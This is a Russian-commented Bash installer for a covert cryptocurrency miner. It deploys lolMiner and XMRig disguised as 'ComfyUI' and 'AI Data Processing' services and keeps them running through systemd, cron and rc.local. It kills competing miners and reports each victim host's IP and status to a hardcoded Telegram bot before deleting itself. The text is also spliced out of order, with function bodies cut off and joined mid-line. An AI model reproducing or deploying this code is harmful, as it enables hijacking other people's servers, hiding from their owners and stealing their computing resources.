#!/bin/bash

#==============================================================================
# БЛОК КОНФИГУРАЦИИ (ЛЕГЕНДА: AI/ML СЕРВЕР)
#==============================================================================
KRYPTEX_IDENTIFIER="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
GPU_POOL="etc.kryptex.network:7033"
CPU_POOL="xmr.kryptex.network:7029"

HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknown-host")
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"

#==============================================================================
# ГЛОБАЛЬНЫЕ СИСТЕМНЫЕ ПЕРЕМЕННЫЕ (ПОД МАСКИРОВКОЙ)
#==============================================================================
BASE_DIR="/opt/system-daemons"
# --- МАСКИРОВКА GPU ---
GPU_SERVICE_NAME="comfy-ui-service"
GPU_DIR="$BASE_DIR/comfyui"
GPU_LOG_FILE="/var/log/comfyui.log"
GPU_SCRIPT_NAME="start_comfy.sh"
# --- МАСКИРОВКА CPU ---
CPU_SERVICE_NAME="ai-data-processor"
CPU_DIR="$BASE_DIR/ai-data"
CPU_LOG_FILE="/var/log/ai-data.log"

#==============================================================================
# ФУНКЦИЯ ТРАНСЛИТЕРАЦИИ И ВЫВОДА В КОНСОЛЬ
#==============================================================================
echo_t() {
    local text="$1"
    local translit_text=$(echo "$text" | sed \
        -e 's/а/a/g; s/б/b/g; s/в/v/g; s/г/g/g; s/д/d/g; s/е/e/g; s/ё/yo/g; s/ж/zh/g; s/з/z/g; s/и/i/g; s/й/y/g; s/к/k/g; s/л/l/g; s/м/m/g; s/н/n/g; s/о/o/g; s/п/p/g; s/р/r/g; s/с/s/g; s/т/t/g; s/у/u/g; s/ф/f/g; s/х/kh/g; s/ц/ts/g; s/ч/ch/g; s/ш/sh/g; s/щ/shch/g; s/ъ//g; s/ы/y/g; s/ь//g; s/э/e/g; s/ю/yu/g; s/я/ya/g' \
        -e 's/А/A/g; s/Б/B/g; s/В/V/g; s/Г/G/g; s/Д/D/g; s/Е/E/g; s/Ё/Yo/g; s/Ж/Zh/g; s/З/Z/g; s/И/I/g; s/Й/Y/g; s/К/K/g; s/Л/L/g; s/М/M/g; s/Н/N/g; s/О/O/g; s/П/P/g; s/Р/R/g; s/С/S/g; s/Т/T/g; s/У/U/g; s/Ф/F/g; s/Х/Kh/g; s/Ц/Ts/g; s/Ч/Ch/g; s/Ш/Sh/g; s/Щ/Shch/g; s/Ъ//g; s/Ы/Y/g; s/Ь//g; s/Э/E/g; s/Ю/Yu/g; s/Я/Ya/g'
    )
    echo "$translit_text"
}

#==============================================================================
# ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
#==============================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

#==============================================================================
# ФУНКЦИЯ ПРОВЕРКИ И УСТАНОВКИ ЗАВИСИМОСТЕЙ
#==============================================================================
install_dependencies() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie o nachale raboty otpravleno"
    echo ""
    
    # Очистка окружения
    ensure_clean_environment
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka ochistki okruzheniya</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Установка модулей
    install_compute_modules
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka ustanovki AI-moduley</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Создание служб
    create_systemd_services
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka sozdaniya AI-sluzhb</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Создание инструментов
    create_management_tools
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka sozdaniya instrumentov</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Остановка старых процессов перед запуском новых
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka starykh protsessov..."
    /usr/local/bin/stop-ai > /dev/null 2>&1
    sleep 3
    
    # Активация служб
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd i aktivatsiya sluzhb..."
    systemctl daemon-reload
    
    systemctl enable --now "${GPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${GPU_SERVICE_NAME}"
    fi
    
    systemctl enable --now "${CPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${CPU_SERVICE_NAME}"
    fi
    echo ""
    
    # Настройка автозапуска
    setup_autostart
    echo ""
    
    # Ждем запуска и проверяем статус
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ozhidanie zapuska sluzhb..."
    sleep 5
    
    gpu_status=$(systemctl is-active "${GPU_SERVICE_NAME}")
    cpu_status=$(systemctl is-active "${CPU_SERVICE_NAME}")
    
    # Проверяем процессы
    gpu_running="ne zapushchen"
    cpu_running="ne zapushchen"
    
    if pgrep -f "lolMiner.*ETCHASH" > /dev/null; then
        gpu_running="zapushchen (PID: $(pgrep -f 'lolMiner.*ETCHASH'))"
    fi
    
    if pgrep -f "xmrig" > /dev/null; then
        cpu_running="zapushchen (PID: $(pgrep -f 'xmrig'))"
    fi
    
    # Финальное уведомление
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Otpravka final'nogo uvedomleniya..."
    send_telegram_notification "🎉 <b>AI-infrastruktura uspeshno razvernuta!</b>

🖥️ Khost: ${HOSTNAME_VAR}
🌐 IP: ${SERVER_IP}
🔑 Worker ID: ${WORKER_NAME}
⏰ Vremya zaversheniya: $(date '+%Y-%m-%d %H:%M:%S')

📊 <b>Status sluzhb:</b>
🎨 ComfyUI (lolMiner): ${gpu_status}
   Protsess: ${gpu_running}

⚙️ AI Data (XMRig): ${cpu_status}
   Protsess: ${cpu_running}

📁 <b>Ustanovlennye komponenty:</b>
• GPU: ${GPU_DIR}/lolMiner
• CPU: ${CPU_DIR}/${CPU_SERVICE_NAME}
• Skrypty: start-ai, stop-ai, status-ai

📝 <b>Logi:</b>
• GPU: ${GPU_LOG_FILE}
• CPU: ${CPU_LOG_FILE}

🎯 Ispol'zuyte komandu <code>status-ai</code> dlya proverki raboty"
    
    echo ""
    echo_t "======================================================================="
    echo_t "  ✓ AI-INFRASTRUKTURA USPESHNO RAZVERNUTA"
    echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "======================================================================="
    echo ""
    echo_t "📋 Status:"
    /usr/local/bin/status-ai
    echo ""
    echo_t "📋 Dostupnye komandy:"
    echo_t "  start-ai   - Zapusk AI sluzhb"
    echo_t "  stop-ai    - Ostanovka AI sluzhb"
    echo_t "  status-ai  - Proverka statusa AI sluzhb"
    echo ""
    echo_t "💡 Maynery nastroeny na avtozapusk pri perezagruzke"
    echo_t "    (systemd + cron + rc.local)"
    echo ""
    
    # Самоуничтожение скрипта
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie skripta..."
    sleep 2
    rm -f -- "$0"
    
    exit 0
}

#==============================================================================
# ЗАПУСК ГЛАВНОЙ ФУНКЦИИ
#==============================================================================
main "$@"M:%S')] Proveryayu i ustanavlivayu zavisimosti..."
    
    if ! command -v wget &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu wget..."
        apt-get update -qq && apt-get install -y wget curl 2>/dev/null
    fi
    
    if ! command -v curl &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu curl..."
        apt-get install -y curl 2>/dev/null
    fi
    
    if ! command -v crontab &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu cron..."
        apt-get install -y cron 2>/dev/null
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Zavisimosti ustanovleny"
}

#==============================================================================
# ФУНКЦИЯ ОЧИСТКИ ОКРУЖЕНИЯ (УПРОЩЕННАЯ ВЕРСИЯ)
#==============================================================================
ensure_clean_environment() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo uproshchennoy ochistki okruzheniya..."
    local killed_count=0
    local removed_lines=0
    
    # --- УДАЛЕНИЕ ТОЛЬКО СТАРЫХ XMRIG И LOLMINER ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie starykh protsessov..."
    
    # Останавливаем только если они НЕ в наших директориях
    for proc_name in "xmrig" "lolMiner"; do
        if pgrep -f "$proc_name" > /dev/null 2>&1; then
            # Проверяем, не наш ли это процесс
            for pid in $(pgrep -f "$proc_name"); do
                proc_path=$(readlink -f /proc/$pid/exe 2>/dev/null)
                if [[ ! "$proc_path" =~ "$BASE_DIR" ]]; then
                    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen staryy protsess: $proc_name (PID: $pid)"
                    kill -9 $pid 2>/dev/null
                    ((killed_count++))
                fi
            done
        fi
    done

    # --- ОЧИСТКА CRONTAB ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab..."
    local cron_temp=$(mktemp)
    crontab -l > "$cron_temp" 2>/dev/null
    
    if [ -s "$cron_temp" ]; then
        local original_lines=$(wc -l < "$cron_temp")
        # Удаляем только строки с подозрительными паттернами, но не наши
        grep -v -E "(curl.*miner|wget.*miner|/tmp/.*miner)" "$cron_temp" > "${cron_temp}.clean"
        local cleaned_lines=$(wc -l < "${cron_temp}.clean")
        removed_lines=$((original_lines - cleaned_lines))
        
        if [ $removed_lines -gt 0 ]; then
            crontab "${cron_temp}.clean"
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab"
        fi
        rm -f "${cron_temp}.clean"
    fi
    rm -f "$cron_temp"

    # --- ОЧИСТКА RC.LOCAL ---
    if [ -f /etc/rc.local ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local..."
        sed -i '/curl.*miner\|wget.*miner/d' /etc/rc.local 2>/dev/null
    fi

    # --- ОЧИСТКА ПОДОЗРИТЕЛЬНЫХ SYSTEMD СЛУЖБ (кроме наших) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb..."
    for service in $(systemctl list-units --type=service --all 2>/dev/null | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do
        # Пропускаем наши службы
        if [[ "$service" == "$GPU_SERVICE_NAME"* ]] || [[ "$service" == "$CPU_SERVICE_NAME"* ]]; then
            continue
        fi
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service"
        systemctl stop "$service" 2>/dev/null
        systemctl disable "$service" 2>/dev/null
        rm -f "/etc/systemd/system/$service" 2>/dev/null
    done

    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uproshchennaya ochistka zavershena. Zaversheno protsessov: $killed_count"
    
    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then
        send_telegram_notification "🧹 <b>Ochistka okruzheniya na ${HOSTNAME_VAR}</b>

Zaversheno starykh protsessov: $killed_count
Udaleno cron zapisey: $removed_lines
IP: ${SERVER_IP}"
    fi
}

#==============================================================================
# ФУНКЦИЯ УСТАНОВКИ AI-МОДУЛЕЙ
#==============================================================================
install_compute_modules() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo ustanovki AI-moduley..."
    
    # Создание директорий
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie direktoriy..."
    mkdir -p "$GPU_DIR" "$CPU_DIR"
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' direktorii"
        send_telegram_notification "❌ Oshibka sozdaniya direktoriy na ${HOSTNAME_VAR}"
        return 1
    fi
    
    # ========== УСТАНОВКА lolMiner для GPU (ETC) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka lolMiner dlya ComfyUI (GPU)..."
    cd "$GPU_DIR" || return 1
    
    local lolminer_url="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie lolMiner..."
    if wget -q "$lolminer_url"; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] lolMiner skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' lolMiner"
        send_telegram_notification "❌ Oshibka skachivaniya GPU-modulya (lolMiner) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka lolMiner..."
    tar -xzf lolMiner_v1.98_Lin64.tar.gz --strip-components=1
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' lolMiner"
        return 1
    fi
    rm -f lolMiner_v1.98_Lin64.tar.gz
    
    # Создание стартового скрипта для lolMiner (ТОЧНО КАК В РАБОЧЕМ СКРИПТЕ)
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie startovogo skripta lolMiner..."
    cat > "$GPU_DIR/$GPU_SCRIPT_NAME" <<EOF
#!/bin/bash
cd $GPU_DIR
./lolMiner --algo ETCHASH --pool $GPU_POOL --user $WORKER_NAME --tls off --nocolor
EOF
    
    chmod +x "$GPU_DIR/$GPU_SCRIPT_NAME"
    chmod +x "$GPU_DIR/lolMiner" 2>/dev/null
    
    # Проверяем что lolMiner существует
    if [ -f "$GPU_DIR/lolMiner" ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✅ GPU-modul' (lolMiner) uspeshno ustanovlen"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ❌ OSHIBKA: lolMiner ne nayden posle raspakovki"
        return 1
    fi
    
    # ========== УСТАНОВКА XMRig для CPU ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka XMRig dlya AI Data Processor (CPU)..."
    cd "$CPU_DIR" || return 1
    
    local cpu_url="https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie XMRig..."
    if wget -q "$cpu_url"; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] XMRig skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' XMRig"
        send_telegram_notification "❌ Oshibka skachivaniya CPU-modulya (XMRig) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka XMRig..."
    tar -xzf xmrig-*-linux-x64.tar.gz --strip-components=1
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' XMRig"
        return 1
    fi
    rm -f xmrig-*-linux-x64.tar.gz
    
    # Переименовываем xmrig (если нужно)
    if [ -f "$CPU_DIR/xmrig" ]; then
        mv "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME" 2>/dev/null || cp "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME"
        chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✅ CPU-modul' (XMRig) uspeshno ustanovlen"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ❌ OSHIBKA: xmrig ne nayden posle raspakovki"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka AI-moduley zavershena"
    send_telegram_notification "✅ AI-moduli ustanovleny na ${HOSTNAME_VAR}

🎨 GPU: lolMiner (ETCHASH)
⚙️ CPU: XMRig v6.18.0 (Monero)
🔑 Worker: ${WORKER_NAME}"
    
    return 0
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ SYSTEMD СЛУЖБ
#==============================================================================
create_systemd_services() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie systemd sluzhb..."
    
    # ========== GPU Служба (lolMiner) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $GPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${GPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=ComfyUI AI Image Generation Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash ${GPU_DIR}/${GPU_SCRIPT_NAME}
Restart=always
RestartSec=10
StandardOutput=append:${GPU_LOG_FILE}
StandardError=append:${GPU_LOG_FILE}
WorkingDirectory=${GPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $GPU_SERVICE_NAME"
        send_telegram_notification "❌ Oshibka sozdaniya GPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $GPU_SERVICE_NAME sozdana"
    
    # ========== CPU Служба (XMRig) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $CPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${CPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=AI Data Processing Service
After=network.target

[Service]
Type=simple
ExecStart=${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages
Restart=always
RestartSec=10
StandardOutput=append:${CPU_LOG_FILE}
StandardError=append:${CPU_LOG_FILE}
WorkingDirectory=${CPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $CPU_SERVICE_NAME"
        send_telegram_notification "❌ Oshibka sozdaniya CPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $CPU_SERVICE_NAME sozdana"
    
    # Перезагрузка systemd
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd daemon..."
    systemctl daemon-reload
    
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' perezagruzit' systemd daemon"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd sluzhby uspeshno sozdany"
    send_telegram_notification "✅ Systemd sluzhby sozdany na ${HOSTNAME_VAR}"
    
    return 0
}

#==============================================================================
# ФУНКЦИЯ ДОБАВЛЕНИЯ В АВТОЗАПУСК
#==============================================================================
setup_autostart() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nastroyka avtozapuska sluzhb..."
    
    # Systemd enable
    systemctl enable "${GPU_SERVICE_NAME}" 2>/dev/null
    systemctl enable "${CPU_SERVICE_NAME}" 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd avtozapusk nastroen"
    
    # Cron @reboot (добавляем с перенаправлением в логи)
    (crontab -l 2>/dev/null | grep -v "${GPU_DIR}\|${CPU_DIR}"; \
     echo "@reboot ${GPU_DIR}/${GPU_SCRIPT_NAME} > ${GPU_LOG_FILE} 2>&1 &"; \
     echo "@reboot ${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages > ${CPU_LOG_FILE} 2>&1 &") | crontab - 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Cron @reboot nastroen"
    
    # rc.local
    if [ ! -f /etc/rc.local ]; then
        echo '#!/bin/bash' > /etc/rc.local
        echo 'exit 0' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    grep -q "${GPU_SCRIPT_NAME}" /etc/rc.local || sed -i "/exit 0/i ${GPU_DIR}/${GPU_SCRIPT_NAME} > ${GPU_LOG_FILE} 2>&1 &" /etc/rc.local
    grep -q "${CPU_SERVICE_NAME}" /etc/rc.local || sed -i "/exit 0/i ${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages > ${CPU_LOG_FILE} 2>&1 &" /etc/rc.local
    chmod +x /etc/rc.local
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] rc.local nastroen"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Mnozhestvennye metody avtozapuska nastroeny"
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ ИНСТРУМЕНТОВ УПРАВЛЕНИЯ
#==============================================================================
create_management_tools() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie instrumentov upravleniya..."
    
    # ========== start-ai ==========
    cat > "/usr/local/bin/start-ai" <<EOF
#!/bin/bash
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk AI sluzhb..."

# Zapusk cherez systemd
systemctl start "${GPU_SERVICE_NAME}"
systemctl start "${CPU_SERVICE_NAME}"

sleep 2

# Proverka statusa
if systemctl is-active --quiet "${GPU_SERVICE_NAME}"; then
    echo "✅ ${GPU_SERVICE_NAME} zapushchen"
else
    echo "❌ ${GPU_SERVICE_NAME} ne zapushchen"
fi

if systemctl is-active --quiet "${CPU_SERVICE_NAME}"; then
    echo "✅ ${CPU_SERVICE_NAME} zapushchen"
else
    echo "❌ ${CPU_SERVICE_NAME} ne zapushchen"
fi

# Otpravka uvedomleniya
SERVER_IP=\$(curl -s -4 ifconfig.me || echo "unknown")
curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \\
    -d "chat_id=${TELEGRAM_CHAT_ID}" \\
    -d "text=🚀 <b>AI sluzhby zapushcheny</b>%0A%0AHost: \$(hostname)%0AIP: \${SERVER_IP}%0AVremya: \$(date)" \\
    -d "parse_mode=HTML" > /dev/null 2>&1
EOF
    chmod +x "/usr/local/bin/start-ai"
    
    # ========== stop-ai ==========
    cat > "/usr/local/bin/stop-ai" <<'EOF'
#!/bin/bash
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka AI sluzhb..."

systemctl stop "comfy-ui-service"
systemctl stop "ai-data-processor"

# Prinuditel'noe zavershenie protsessov
pkill -f "lolMiner.*ETCHASH"
pkill -f "xmrig"
sleep 2
pkill -9 -f "lolMiner.*ETCHASH" 2>/dev/null
pkill -9 -f "xmrig" 2>/dev/null

echo "✅ AI sluzhby ostanovleny"
EOF
    chmod +x "/usr/local/bin/stop-ai"
    
    # ========== status-ai ==========
    cat > "/usr/local/bin/status-ai" <<EOF
#!/bin/bash
echo "=== Status AI-sluzhb ==="

if pgrep -f "lolMiner.*ETCHASH" > /dev/null; then
    echo "✅ ComfyUI Service (GPU): Zapushchen (PID: \$(pgrep -f 'lolMiner.*ETCHASH'))"
else
    echo "❌ ComfyUI Service (GPU): Ne zapushchen"
fi

if pgrep -f "xmrig" > /dev/null; then
    echo "✅ AI Data Processor (CPU): Zapushchen (PID: \$(pgrep -f 'xmrig'))"
else
    echo "❌ AI Data Processor (CPU): Ne zapushchen"
fi

echo ""
echo "=== Logi ComfyUI (poslednie 5 strok) ==="
tail -5 ${GPU_LOG_FILE} 2>/dev/null || echo "Log pust ili otsutstvuet"

echo ""
echo "=== Logi AI Data Processor (poslednie 5 strok) ==="
tail -5 ${CPU_LOG_FILE} 2>/dev/null || echo "Log pust ili otsutstvuet"

# Otpravka v Telegram
GPU_STATUS=\$(systemctl is-active comfy-ui-service)
CPU_STATUS=\$(systemctl is-active ai-data-processor)
GPU_LOGS=\$(tail -3 ${GPU_LOG_FILE} 2>/dev/null || echo "net dannyh")
CPU_LOGS=\$(tail -3 ${CPU_LOG_FILE} 2>/dev/null || echo "net dannyh")

MESSAGE="📊 <b>Status AI-sluzhb</b>

Host: \$(hostname)
IP: \$(curl -s ifconfig.me)

🎨 ComfyUI: \${GPU_STATUS}
⚙️ AI Data: \${CPU_STATUS}

GPU logs:
<code>\${GPU_LOGS}</code>

CPU logs:
<code>\${CPU_LOGS}</code>"

curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \\
    -d "chat_id=${TELEGRAM_CHAT_ID}" \\
    -d "text=\${MESSAGE}" \\
    -d "parse_mode=HTML" > /dev/null 2>&1

echo ""
echo "Status otpravlen v Telegram"
EOF
    chmod +x "/usr/local/bin/status-ai"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Vse instrumenty upravleniya sozdany"
    send_telegram_notification "✅ Instrumenty upravleniya sozdany na ${HOSTNAME_VAR}

Komandy: start-ai, stop-ai, status-ai"
    
    return 0
}

#==============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
#==============================================================================
main() {
    echo_t "======================================================================="
    echo_t "  Sistemnyy skript dlya upravleniya AI-servisami"
    echo_t "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "  Khost: ${HOSTNAME_VAR}"
    echo_t "======================================================================="
    echo ""
    
    # Проверка root
    if [ "$EUID" -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Skript dolzhen byt' zapushchen s pravami root"
        exit 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Proverka prav root proydena"
    echo ""
    
    # Установка зависимостей
    install_dependencies
    echo ""
    
    # Уведомление о начале
    send_telegram_notification "🔄 <b>Nachalo ustanovki AI-infrastruktury</b>

Khost: ${HOSTNAME_VAR}
IP: ${SERVER_IP}
Worker ID: ${WORKER_NAME}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')"
    
    echo_t "[$(date '+%Y-%m-%d %H:%
